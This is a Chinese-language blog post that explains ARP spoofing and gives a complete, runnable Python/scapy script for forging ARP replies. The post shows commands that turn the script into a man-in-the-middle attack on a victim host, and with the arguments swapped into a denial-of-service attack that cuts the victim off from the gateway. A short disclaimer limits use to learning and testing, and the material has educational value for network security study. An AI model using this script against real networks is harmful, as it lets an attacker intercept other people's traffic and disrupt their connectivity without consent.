<!doctype html><html lang=zh-CN id=page><head><meta charset=utf-8><title>Python 进行 ARP 欺骗 - X̂ Blog</title><meta name=viewport content="width=device-width,initial-scale=1"><link href=/css/font.css type=text/css rel=stylesheet><link href=/css/main.css type=text/css rel=stylesheet><link href=/css/github-markdown-light.css type=text/css rel=stylesheet><link rel=icon href=/favicon.svg></head><body><header><a href=/ id=logo><svg xmlns="http://www.w3.org/2000/svg" width="38.82" height="52.68" viewBox="0 -765 572 776" xmlns:xlink="http://www.w3.org/1999/xlink" style><defs><path id="MJX-9-TEX-I-78" d="M52 289q7 42 54 97t116 56q35 0 64-18t43-45q42 63 101 63 37 0 64-22t28-59q0-29-14-47t-27-22-23-4q-19 0-31 11t-12 29q0 46 50 63-11 13-40 13-13 0-19-2-38-16-56-66-60-221-60-258 0-28 16-40t35-12q37 0 73 33t49 81q3 10 6 11t16 2h4q15 0 15-8 0-1-2-11-16-57-62-101T333-11q-70 0-106 63-41-62-94-62h-6Q78-10 57 16T35 71q0 32 19 52t45 20q43 0 43-42 0-20-12-35T107 46 94 41l-3-1q0-1 6-4t16-7 19-3q36 0 62 45 9 16 23 68t28 108 16 66q5 27 5 39 0 28-15 40t-34 12q-40 0-75-32T93 290q-2-9-5-10t-16-2H58q-6 6-6 11z"/><path id="MJX-9-TEX-N-5E" d="M112 560 249 694l8-8Q387 562 387 560l-26-29q-2 1-58 50l-53 46-55-47q-13-11-26-23t-21-19l-8-6q-2-2-15 14l-13 14z"/></defs><g stroke="currentcolor" fill="currentcolor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="TeXAtom"><g data-mml-node="mover"><g data-mml-node="mi"><use xlink:href="#MJX-9-TEX-I-78"/></g><g data-mml-node="mo" transform="translate(63.8, -29)"><use xlink:href="#MJX-9-TEX-N-5E"/></g></g></g></g></g></svg><b>xhat</b></a><nav><ul><li><a href=/ class=active>文章</a></li><li><a href=/tags/>标签</a></li><li><a href=/archives/>归档</a></li><li><a href=/about/>关于</a></li></ul></nav></header><section class=main><article class=content><h2 class=title>Python 进行 ARP 欺骗</h2><div class=remark><time datetime="2021-06-09 18:27:39 +0800 +0800">2021-06-09</time></div><div class=tags><a href=/tags/python/>Python</a>
<a href=/tags/%E7%BD%91%E7%BB%9C/>网络</a></div><div class=markdown-body><blockquote><p>声明：本文所用的脚本仅限于学习测试目的，在使用中造成的一切后果与作者无关，后果自负。</p></blockquote><p>ARP (Address Resolution Protocol) 即地址解析协议，是一种将 IP 地址转化成物理地址的协议。我们常用的以太网是通过 MAC 地址进行通信的，所以在网络链路上传送数据帧时，最终是使用硬件地址的。</p><p>一个典型的 ARP 流程如下表所示，这里为了叙述方便，硬件地址做了简化处理。</p><table><thead><tr><th>源地址</th><th>目的地址</th><th>内容</th></tr></thead><tbody><tr><td>12:34:56</td><td>ff:ff:ff</td><td>Who has 192.168.1.2? Tell 192.168.1.3</td></tr><tr><td>78:ab:cd</td><td>12:34:56</td><td>192.168.1.2 is at 78:ab:cd</td></tr></tbody></table><p>大致流程就是<code>12:34:56</code>发送一个广播，问谁有某个 IP 地址，当对方收到这个广播时，如果自己的 IP 和广播里问的 IP 是一致的，就发送一个回复给提问者。这样提问者就建立了 IP 地址和物理地址的对应关系。</p><p>那如果对方不守信呢，明明自己没有这个 IP，还是坚持回复这个 IP 是自己，欺骗了提问者。这时提问者就会把数据包发给其他人，相当于数据包被人偷了！</p><p>没错，ARP 欺骗就是这个原理，可以用来做中间人攻击和拒绝服务攻击。下面分别实验一下两种情况。</p><p>网关 IP：10.1.45.254</p><p>受害者 IP：10.1.45.2</p><h2 id=中间人攻击>中间人攻击</h2><p>欺骗受害者网关在我们这里，受害者就会把数据包发给我们，我们再代为转发给真正的网关，相当于做了一个中间人，这时我们可以捕获到受害者的通信数据包。</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#998;font-style:italic># arpspoof.py</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>import</span> <span style=color:#555>sys</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>from</span> <span style=color:#555>scapy.layers.l2</span> <span style=color:#000;font-weight:700>import</span> Ether, ARP, sendp
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>from</span> <span style=color:#555>scapy.layers.l2</span> <span style=color:#000;font-weight:700>import</span> getmacbyip
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>if</span> __name__ <span style=color:#000;font-weight:700>==</span> <span style=color:#d14>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    <span style=color:#000;font-weight:700>if</span> <span style=color:#0086b3>len</span>(sys<span style=color:#000;font-weight:700>.</span>argv) <span style=color:#000;font-weight:700>&lt;</span> <span style=color:#099>3</span>:
</span></span><span style=display:flex><span>        sys<span style=color:#000;font-weight:700>.</span>exit(<span style=color:#099>1</span>)
</span></span><span style=display:flex><span>    target_ip <span style=color:#000;font-weight:700>=</span> sys<span style=color:#000;font-weight:700>.</span>argv[<span style=color:#099>1</span>]
</span></span><span style=display:flex><span>    host <span style=color:#000;font-weight:700>=</span> sys<span style=color:#000;font-weight:700>.</span>argv[<span style=color:#099>2</span>]
</span></span><span style=display:flex><span>    target_mac <span style=color:#000;font-weight:700>=</span> getmacbyip(target_ip)
</span></span><span style=display:flex><span>    host_mac <span style=color:#000;font-weight:700>=</span> getmacbyip(host)
</span></span><span style=display:flex><span>    pkt <span style=color:#000;font-weight:700>=</span> Ether() <span style=color:#000;font-weight:700>/</span> ARP(op<span style=color:#000;font-weight:700>=</span><span style=color:#d14>&#39;is-at&#39;</span>, psrc<span style=color:#000;font-weight:700>=</span>host, pdst<span style=color:#000;font-weight:700>=</span>target_ip, hwdst<span style=color:#000;font-weight:700>=</span>target_mac)
</span></span><span style=display:flex><span>    <span style=color:#0086b3>print</span>(pkt<span style=color:#000;font-weight:700>.</span>show())
</span></span><span style=display:flex><span>    sendp(pkt, inter<span style=color:#000;font-weight:700>=</span><span style=color:#099>2</span>, loop<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>)
</span></span><span style=display:flex><span>    <span style=color:#0086b3>print</span>(<span style=color:#d14>&#39;Cleaning...&#39;</span>)
</span></span><span style=display:flex><span>    sendp(Ether(src<span style=color:#000;font-weight:700>=</span>host_mac) <span style=color:#000;font-weight:700>/</span> ARP(op<span style=color:#000;font-weight:700>=</span><span style=color:#d14>&#39;is-at&#39;</span>, psrc<span style=color:#000;font-weight:700>=</span>host, hwsrc<span style=color:#000;font-weight:700>=</span>host_mac, pdst<span style=color:#000;font-weight:700>=</span>target_ip, hwdst<span style=color:#000;font-weight:700>=</span>target_mac), inter<span style=color:#000;font-weight:700>=</span><span style=color:#099>1</span>, count<span style=color:#000;font-weight:700>=</span><span style=color:#099>3</span>)
</span></span></code></pre></div><p>注意这里没有开启 IP 转发，具体如何开启请根据系统自行解决。</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python3 arpspoof.py 10.1.45.2 10.1.45.254
</span></span></code></pre></div><h2 id=拒绝服务攻击>拒绝服务攻击</h2><p>欺骗网关受害者在我们这里，网关就会把受害者的数据包发给我们，我们再把它丢弃。这时受害者就无法正常收到回复包，也就无法正常完成通信了。其实中间人攻击也可以做拒绝服务，只需要不转发数据包就好了。</p><p>脚本还是一样，只需要把输入的两个参数对调即可。</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python3 arpspoof.py 10.1.45.254 10.1.45.2
</span></span></code></pre></div></div><link href=https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.css rel=stylesheet><script src=https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/katex.min.js></script>
<script src=https://cdn.bootcdn.net/ajax/libs/KaTeX/0.12.0/contrib/auto-render.min.js onload='renderMathInElement(document.querySelector(`.content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})'></script></article></section><section class=tail><div class=content id=post-nav><a title="Golang 中使用 JWT 进行认证" rel=prev href=/posts/golang-jwt/><span>前篇</span>Golang 中使用 JWT 进行认证</a>
<a title="Windows 创建临时文件" rel=next href=/posts/windows-createfile-tempfile/><span>后篇</span>Windows 创建临时文件</a></div><div class=content id=post-comment><script src=https://giscus.app/client.js data-repo=koho/blog data-repo-id="MDEwOlJlcG9zaXRvcnkzMjM1MDUxMDk=" data-category=Announcements data-category-id=DIC_kwDOE0hL1c4COeTz data-mapping=pathname data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light data-lang=zh-CN crossorigin=anonymous async></script></div><div class=content id=post-related><h3 class=title>延伸阅读</h3><div class=grid><div class=card><a href=/posts/python-send-email/ rel=bookmark><div class=banner style=background-image:url(/images/email.webp)></div><h4>Python 发送 Email 通知</h4><p>2021-04-20</p><div class=tags><span>Python</span></div></a></div><div class=card><a href=/posts/openwrt-pon-stick/ rel=bookmark><div class=banner style=background-image:url(/images/image-20210206141943.jpg)></div><h4>OpenWrt + Pon Stick 配置教程</h4><p>2021-02-06</p><div class=tags><span>OpenWrt</span>
<span>网络</span></div></a></div></div></div></section><footer><span>Powered by <a href=https://gohugo.io>Hugo</a></span><br><span>© 2023 xhat</span></footer></body></html>